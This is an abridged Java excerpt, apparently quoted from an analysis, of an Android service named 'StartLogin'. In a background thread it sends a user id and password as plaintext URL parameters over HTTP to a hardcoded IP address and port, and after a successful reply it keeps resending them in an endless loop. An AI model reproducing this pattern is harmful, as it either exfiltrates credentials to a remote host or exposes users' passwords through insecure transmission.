...
public class StartLogin extends Service {
        ...
        Thread thread = new Thread(new Runnable() {
            ...
            public void run() {
                try{
                    ...
                    HttpGet get = new HttpGet("http://183.101.181.140:8888/?in="+id+"&pass="+passwd+"&");
                    ...
                    if(httpResponse.getStatusLine().getStatusCode() == 200){
                        ...
                        while(true) {
                            try {
                                ...
                                HttpGet get2 = new HttpGet("http://183.101.181.140:8888/?in="+id+"&pass="+passwd+"&");
